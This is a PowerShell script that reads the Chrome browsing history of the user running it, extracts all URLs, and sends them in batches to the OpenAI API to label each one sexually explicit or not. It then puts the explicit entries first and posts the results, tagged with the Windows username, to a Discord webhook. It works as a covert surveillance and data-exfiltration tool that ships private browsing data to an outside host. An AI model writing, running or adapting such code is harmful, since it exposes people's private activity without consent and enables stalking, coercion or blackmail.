# ================== CONFIG ==================
$k = $env:OPENAI_API_KEY
$webhook = $env:DISCORD_WEBHOOK_URL
$user = $env:USERNAME
$h = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"

# ============ DISCORD CHUNK HELPER ============
function Split-DiscordChunks {
    param([string]$Text,[int]$MaxLen=1800)
    $chunks = @()
    $i = 0
    while ($i -lt $Text.Length) {
        $len = [Math]::Min($MaxLen, $Text.Length - $i)
        $chunks += $Text.Substring($i, $len)
        $i += $len
    }
    $chunks
}

# ============ REORDER EXPLICIT FIRST ============
function Reorder-ExplicitFirst {
    param([string]$Text)
    $blocks = $Text -split "(\r?\n){2,}"
    $yes = @()
    $no  = @()
    foreach ($b in $blocks) {
        if ($b -match "Explicit Content:\s*YES") { $yes += $b }
        elseif ($b.Trim().Length -gt 0) { $no += $b }
    }
    ($yes + $no) -join "`r`n`r`n"
}

# ================== MAIN ==================
if (Test-Path $h) {

    $u = Get-Content $h -Raw |
        Select-String '(https?://[^\x00-\x20"<>]+)' -AllMatches |
        ForEach-Object { $_.Matches.Value } |
        Sort-Object -Unique |
        Where-Object { $_ -match '^https?://' }

    $totalBatches = [int][Math]::Ceiling($u.Count / 50)

    for ($i = 0; $i -lt $u.Count; $i += 50) {

        $batchNum = [int]($i / 50) + 1
        Write-Host ("Batch " + $batchNum + " of " + $totalBatches)

        $chunk = $u[$i..([Math]::Min($i + 49, $u.Count - 1))]

        $prompt = @"
For EACH URL below, output EXACTLY the following format.
Do not add or remove fields.
Do not skip URLs.
Do not reorder fields.

FORMAT (repeat for each URL):

URL: <the url>
Category: <one of: Account Management | Social | Search | Gaming | News | Shopping | Utilities | Other | Adult>
Explicit Content: YES or NO
Explanation: <one short sentence>

IMPORTANT RULES:
- Mark Explicit Content = YES ONLY if the site is pornographic or sexually explicit.
- Do NOT flag gambling, login pages, OAuth, account settings, downloads, forums, or social media.
- If unsure, set Explicit Content = NO.
- Most links will be Explicit Content = NO.

URLs:
$($chunk -join "`r`n")
"@

        $body = @{
            model = "gpt-3.5-turbo"
            messages = @(
                @{ role = "system"; content = "Follow the format exactly. Plain text only." },
                @{ role = "user"; content = $prompt }
            )
            temperature = 0.1
        } | ConvertTo-Json -Depth 6

        $success = $false

        for ($r = 0; $r -lt 3 -and -not $success; $r++) {
            try {
                $resp = Invoke-RestMethod `
                    -Uri "https://api.openai.com/v1/chat/completions" `
                    -Method Post `
                    -Headers @{ Authorization = "Bearer $k" } `
                    -ContentType "application/json; charset=utf-8" `
                    -TimeoutSec 60 `
                    -Body ([Text.Encoding]::UTF8.GetBytes($body))

                if ($resp.choices) {

                    $text = $resp.choices[0].message.content
                    $text = Reorder-ExplicitFirst $text
                    $parts = Split-DiscordChunks $text 1800

                    foreach ($part in $parts) {
                        $titleText = $user + " - Batch " + $batchNum
                        $discord = @{
                            embeds = @(
                                @{
                                    title = $titleText
                                    description = $part
                                }
                            )
                        } | ConvertTo-Json -Depth 6

                        Invoke-RestMethod `
                            -Uri $webhook `
                            -Method Post `
                            -ContentType "application/json" `
                            -Body $discord

                        Start-Sleep -Milliseconds 500
                    }

                    $success = $true
                }
            }
            catch {
                Start-Sleep -Seconds (2 * ($r + 1))
            }
        }

        Start-Sleep -Milliseconds 1500
    }
}
else {
    Write-Host "Chrome history not found"
}
